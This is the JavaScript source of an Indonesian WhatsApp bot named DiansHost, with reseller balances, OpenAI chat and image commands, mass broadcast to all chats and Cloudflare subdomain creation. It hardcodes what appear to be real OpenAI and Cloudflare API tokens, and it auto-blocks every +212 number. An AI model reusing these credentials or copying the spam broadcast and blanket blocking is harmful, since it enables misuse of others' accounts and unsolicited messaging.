
// 62895328298685
require('../config/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const cheerio = require("cheerio");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");
const ytdl = require('ytdl-core')
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./lib/functions')
const { Configuration, OpenAIApi } = require("openai");
let setting = require("../api_key.json");
module.exports = DiansHost = async (DiansHost, m, chatUpdate, store) => {
try {    
//DiansHost ofc
    const ntiktok = (' DiansHost')
    const fdoc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        documentMessage: {
            title: `${ttname}`,
            jpegThumbnail: thumb,
        }
    }
    }
const pler = JSON.parse(fs.readFileSync('./js/db/idgrup.json').toString())
   const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
    const db_error = JSON.parse(fs.readFileSync('./database/error.json'));
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
    const { isUrl, getRandom, getGroupAdmins, runtime, sleep, jsonformat, reSize, makeid, fetchJson, getBuffer } = require("../js/lib/myfunc");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../js/lib/addlist');
    const jangan = m.isGroup ? pler.includes(m.chat) : false	
if (!DiansHost.public) {
if (!m.key.fromMe) return
}
    const { addSaldo, minSaldo, cekSaldo } = require("../function/deposit");
global.prefa = ['','.']
    const payment = "./config/setting"
    // Database
let db_saldo = JSON.parse(fs.readFileSync("./options/saldo.json"));
let depositPath = "./options/deposit/"
//nof ahahha
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[#*+,.?=''():%!_&`^|/\\^]/.test(body) ? body.match(/^[#*+,.?=''():%_&!`^|/\\^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const mek = chatUpdate.messages[0];
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await DiansHost.decodeJid(DiansHost.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const q = args.join(" ");
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m
const text =  args.join(" ")
const owner = JSON.parse(fs.readFileSync('./config/seller.json').toString())
const isSeler = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const isGroup = m.key.remoteJid.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await DiansHost.groupMetadata(m.chat).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
var sticSukses = (hehe) => {
ano = fs.readFileSync('./subscribeDiansHost/stickernye/SuksesCok.webp')
DiansHost.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
if (!DiansHost.public) {
if (!m.key.fromMe) return
}
    const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
    //tourl
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('../js/lib/exif')
    //ANTILINK
const isAntiLink = antilink.includes(from) ? true : false
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

//// welcom
///ANTI LINK YAH
//Anti Link
//Antilink
if (isGroup && isAntiLink && isBotGroupAdmins){
if (budy.match(`chat.whatsapp.com`)) {
m.reply(` *ANTI LINK* \n\n*Kamu terdeteksi mengirim link group & melakukan pengiriman link basis private personal chat*`)
if (!isBotAdmins) return m.reply(`*Bot aja bukan admin anj*`)
let gclink = (`https://chat.whatsapp.com/`+await DiansHost.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
if (isAdmins) return m.reply(`*maaf kamu admin*`)
if (isCreator) return m.reply(`*maaf kamu owner bot ku*`)
await DiansHost.sendMessage(m.chat, {
               delete: {
                  remoteJid: m.chat,
                  fromMe: false,
                  id: m.key.id,
                  participant: m.sender
               }
            }).then((res) => m.reply('Link Telah Dihapus, Jangan Di Ulangi Lagi ya kontol')).catch((err) => m.reply('gagal menghapus'))
}
}
    //Auto Block Nomor Luar Negeri
if (sender.startsWith('212')) {
m.reply(`Maaf kak ${pushname} kamu telah di block oleh bot!!\nKarena kamu menggunakan nomor *+212*`)
setTimeout( () => {
DiansHost.updateBlockStatus(sender, 'block')
}, 500)
}
    
    //DiansHost
const { color, bgcolor, mycolor } = require('../js/lib/color')
if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
		
try {
ppuser = await DiansHost.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}
const nyoutube = ('DiansHost')  //ubah di config biar ngk emr
//[ DIWNLOAD YTMP3 ]//
// GAUSAH UBAH UBAH TOD NTAR ERROR #DiansHost
async function sendDiansHostMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await DiansHost.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
    const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await DiansHost.sendMessage(m.chat, { video: fs.readFileSync(mp4File), caption: 'sukses', gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
    }
    const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await DiansHost.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
    }
 const dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList
    const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
//logo MENTAHAN 
const hw1 = fs.readFileSync ('./logo/hw1.jpg')
const hw2 = fs.readFileSync ('./logo/hw2.jpg')
const hw3 = fs.readFileSync ('./logo/hw3.jpg')
const hw4 = fs.readFileSync ('./logo/hw4.jpg')
const hw5 = fs.readFileSync ('./logo/hw5.jpg')
const hw6 = fs.readFileSync ('./logo/hw6.jpg')
const hw7 = fs.readFileSync ('./logo/hw7.jpg')
const hw8 = fs.readFileSync ('./logo/hw8.jpg')
const hw9 = fs.readFileSync ('./logo/hw9.jpg')
const hw10 = fs.readFileSync ('./logo/hw10.jpg')
const hw11 = fs.readFileSync ('./logo/hw11.jpg')
const hw12 = fs.readFileSync ('./logo/hw12.jpg')
const hw13 = fs.readFileSync ('./logo/hw13.jpg')
const hw14 = fs.readFileSync ('./logo/hw14.jpg')
const hw15 = fs.readFileSync ('./logo/hw15.jpg')
const hw16 = fs.readFileSync ('./logo/hw16.jpg')
const hw17 = fs.readFileSync ('./logo/hw17.jpg')
const hw18 = fs.readFileSync ('./logo/hw18.jpg')
const hw19 = fs.readFileSync ('./logo/hw19.jpg')
const hw20 = fs.readFileSync ('./logo/hw20.jpg')
const hw21 = fs.readFileSync ('./logo/hw21.jpg')
const hw22 = fs.readFileSync ('./logo/hw22.jpg')
const hw23 = fs.readFileSync ('./logo/hw23.jpg')
const hw24 = fs.readFileSync ('./logo/hw24.jpg')
const hw25 = fs.readFileSync ('./logo/hw25.jpg')
const hw26 = fs.readFileSync ('./logo/hw26.jpg')
const hw27 = fs.readFileSync ('./logo/hw27.jpg')
const hw28 = fs.readFileSync ('./logo/hw28.jpg')
const hw29 = fs.readFileSync ('./logo/hw29.jpg')
const hw30 = fs.readFileSync ('./logo/hw30.jpg')
//twck make
		//WAKTU
 const kini = '```'    
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                        }
if(time2 < "19:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                         }
if(time2 < "18:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/08/7b/81087b2e732dc0e25d8875b135d579b9.jpg')
                         }
if(time2 < "15:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                         }
if(time2 < "11:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                         }
if(time2 < "06:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/15/8e/ea/158eea299c01433aae6744599d2fdc3a.jpg')
}

const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + 'VERSION:3.0\n' 
            + 'FN:DiansHost\n' // full name
            + 'ORG:DiansHost;\n' // the organization of the contact
            + 'TEL;type=CELL;type=VOICE;waid=62895328298685:+62 882 8681 3224\n' // WhatsApp ID + phone number
            + 'END:VCARD'
             prit = [
                {buttonId: 'daftar', buttonText: {displayText: 'DAFTAR RESELLER'}, type: 2}
              ]
              
               pritprit = {
                  text: 'sepertinya kamu belum daftar resseler',
                  footer: 'diansHost',
                  buttons: prit,
                  headerType: 1
              }
switch (command){
    case 'owner':
   
    DiansHost.sendMessage(
        from,
        { 
            contacts: { 
                displayName: 'Ini Adalah Contact Pembuat Bot Kak', 
                contacts: [{ vcard }] 
            }
        }
    )
    DiansHost.sendMessage(from, {text : 'YOUTUBE : https://youtube.com/@DiansHost\nINSTAGRAM : https://instagram.com/ziroystore_reall1 :'}, {quoted : m})
      

        
        const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `https://arifzynstore.my.id`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;diansHost,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/86a66c629f5747bebd5aa.jpg' }}}}
function parseMentions(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
        function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = DiansHost.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = DiansHost.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
        function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
        }
         //FUNCTION DEPOSIT


break

case 'saldo':{
m.reply(`* CHECK YOUR INFO *

 _ *Name:* ${pushname}_
 _ *Nomer:* ${sender.split('@')[0]}_
 _ *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk buysrv_
_Tidak bisa ditarik atau transfer_!`)
}
        break

case 'deposit': case 'depo':{
var rows = [
{
title: "QRIS",
rowId: "qris",
description: "Status : True"
},
{
title: "DANA",
rowId: "dana",
description: "Status : True"
}
]
var dep_but = {
text: `Hai *@${sender.split('@')[0]}*\nIngin melakukan deposit saldo? Silahkan pilih payment yang tersedia`,
buttonText: "PILIH DISINI",
sections: [ { title: "PAYMENT DEPOSIT", rows } ],
mentions: [sender]
}
DiansHost.sendMessage(from, dep_but)
}
     

break
        case 'buyprem':
        if (cekSaldo(sender,db_saldo) < 5000) return DiansHost.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let cekbanh = await DiansHost.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekbanh.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`selamat   Kepada ${pushname}
Nomor ${bnnd} Sudah Premium\nanda skrng dapat mengakses berikut

 Dapat Mengakses All Fitur 
 Fitur Open Ai
 Create Panel
 Dan Laen Laen 
 Kecuali Create Admin Panel ya banh
`)
break
    case 'cekmyprem':{
let teks = ` INFO USER 

 Name : ${pushname}
 Number : ${m.sender.split('@')[0]}
 Status : ${isCreator ? "Owner ":"User "}
 Status : ${isSeler ? "PREMIUM":"GRATISAN"}
 Limit : ${isCreator ? "Unlimited " :""}
 Mau Buy prem? ketik ${prefix}buyprem

`
m.reply(teks)
    }
            break
                case "ai": case "openai":
          try {
              if (!isSeler) return m.reply(`Maaf Fitur ini Hanya untuk yang sudah prem untuk mengecek anda prem atau tidak silahkan ketik .cekmyprem`)  
            if (setting.keyopenai === "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")
            if (!text) return m.reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
            const configuration = new Configuration({
              apiKey: setting.keyopenai,
            });
            const openai = new OpenAIApi(configuration);

            const response = await openai.createCompletion({
              model: "text-davinci-003",
              prompt: text,
              temperature: 0.3,
              max_tokens: 2000,
              top_p: 1.0,
              frequency_penalty: 0.0,
              presence_penalty: 0.0,
            });
            m.reply(`${response.data.choices[0].text}`);
          } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
          break;
        case "menu2":
          m.reply(`*Whatsapp Bot Broadcast*
                    
*1. Broadcast Group Only.*
Cmd: ${prefix}pushmember <text>
Menu ini hanya akan mengirim broadcast ke grup.

*2. Broadcast All Chat.*
Cmd: ${prefix}pushmember2 <text>
Menu ini akan mengirim broadcast ke semua chat kamu termasuk ke grup juga.
 
<text> bisa kamu ganti pakai kata-kata kalian.

NOTE: JANGAN TERLALU BANYAK MENGIRIM BROADCAST KARENA AKAN MENGAKIBATKAN AKUN WHATSAPP KAMU TERBANNED.`);
          break;
        case "smeme": case "stickmeme": case "stikmeme": case "stickermeme": case "stikermeme": {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return respond
            if (!text) return respond
	        m.reply(`Wet bro`)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await DiansHost.downloadAndSaveMediaMessage(qmsg)
	        let { TelegraPh } = require('../uploader')
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
	        let FaTiH = await DiansHost.sendImageAsSticker(m.chat, smeme, fdoc, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break
        case "img": case "ai-img": case "image": case "images":
          try {
            if (setting.keyopenai === "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")
            if (!text) return m.reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Gamabar gunung`);
            const configuration = new Configuration({
              apiKey: setting.keyopenai,
            });
            const openai = new OpenAIApi(configuration);
            m.reply(`Wet Banh`)
            const response = await openai.createImage({
              prompt: text,
              n: 1,
              size: "512x512",
            });
            //console.log(response.data.data[0].url)
            DiansHost.sendImage(from, response.data.data[0].url, text, mek);
            } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
        break;
        case "pushmember2":
          {
            if (!isCreator) return m.reply('Hadeh Ngapain') 
            if (!text) throw `Menu ini akan mengirim broadcast ke semua chat kamu termasuk ke grup juga.\n\nContoh: ${prefix + command} pengumuman besok libur`;
            let anu = await store.chats.all().map((v) => v.id);
            m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`);
            for (let yoi of anu) {
              await sleep(delayy);
              let txt = `${text}`;
              DiansHost.sendText(yoi, txt);
            }
            m.reply("Sukses Broadcast");
          }
          break;
        case 'ytmp4': case 'mp4':{
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply(`Wet banh`)
downloadMp4(text)
}
break
               case "pushmember": {
            if (!isCreator) return m.reply('hadeh') 
            if (!text) throw `Menu ini hanya akan mengirim pesan ke grup.\n\nContoh: ${prefix + command} pengumuman besok libur`;
            let getGroups = await DiansHost.groupFetchAllParticipating();
            let groups = Object.entries(getGroups)
              .slice(0)
              .map((entry) => entry[1]);
            let anu = groups.map((v) => v.id);
            m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`);
            for (let i of anu) {
              await sleep(delayy);
              let txt = `${text}`;
              DiansHost.sendText(i, txt);
            }
            m.reply(`Sukses Mengirim ${command} Ke ${anu.length} Group`);
          }
          break;
        case 'tourl': {
        let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../uploader')
        let media = await DiansHost.downloadAndSaveMediaMessage(qmsg)
        if (/image/.test(mime)) {
            let anu = await TelegraPh(media)
            m.reply(util.format(anu))
        } else if (!/image/.test(mime)) {
            let anu = await UploadFileUgu(media)
            m.reply(util.format(anu)) 
        }
        await fs.
        unlinkSync(media)
    }
    break;
case 'yayaya':{
if (!isCreator) return m.reply('F')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(` *SALDO USER* 
ID: ${q.split(",")[0]}
Nomer: @${q.split(",")[0]}
Tanggal: ${tanggal}
Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
}
break   
case 'promote': {
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DiansHost.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
        break

case 'minsaldo':
if (!isCreator) m.reply(mess.owner)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(` *SALDO USER* 
ID: ${q.split(",")[0]}
Nomer: @${q.split(",")[0]}
Tanggal: ${tanggal}
Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
//=================================================//
case 'demote': {
if (!isCreator) return m.reply('Boleh Aku Tanya ? Kamu Owner ?')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DiansHost.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
        break
        case 'domain':{
m.reply(Domain = `* LIST DOMAIN *

 ${prefix}domain1 jasa-panel.my.id 
 ${prefix}domain2 didinsec.biz.id 
 ${prefix}domain3 didindev.my.id 
 ${prefix}domain4 sellerpannel.my.id 
 ${prefix}domain5 panellku.my.id 
 ${prefix}domain6 panellku.me 
 ${prefix}domain7 panellku.biz.id 
 ${prefix}domain8 panellku.com 
 ${prefix}domain9 mypanel.biz.id 
 ${prefix}domain10 panellku.art 
 ${prefix}domain11 DiansHost.xyz 
 ${prefix}domain12 DiansHost.site 
 ${prefix}domain13 DiansHost.com 
 ${prefix}domain14 kangpannel.xyz 
 ${prefix}domain15 DiansHost.art 
 ${prefix}domain16 akmalmodz.biz.id 
 ${prefix}domain17 DiansHost.cfd 
 ${prefix}domain18 DiansHost.com 
 ${prefix}domain19 DiansHost.icu 
 ${prefix}domain20 DiansHost.my.id 
 ${prefix}domain21 DiansHost.net 
 ${prefix}domain22 dianshost.tech 
 ${prefix}domain23 ziroyhost.xyz 
 ${prefix}domain24 DiansHost.com 
 ${prefix}domain25 DiansHost.cfd 
 ${prefix}domain26 DiansHost.biz.id 
 ${prefix}domain27 panellstore.art 
 ${prefix}domain28 panellstore.cfd 
 ${prefix}domain29 panellstore.com 
 ${prefix}domain30 panellstore.icu 
 ${prefix}domain31 panellstore.xyz 
`) 
}
break
 case 'domain1': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ab732313828957ac4dfa9dd05ecdbea4";
               let apitoken = "wLoUr4uAAk_l2zOW03A_ePS0ishGEeLCjZrIXCdC";
               let tld = "jasa-panel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "A4E0OuHCDuUy09QCENX2t6suDS5EIIi3urJO101r";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
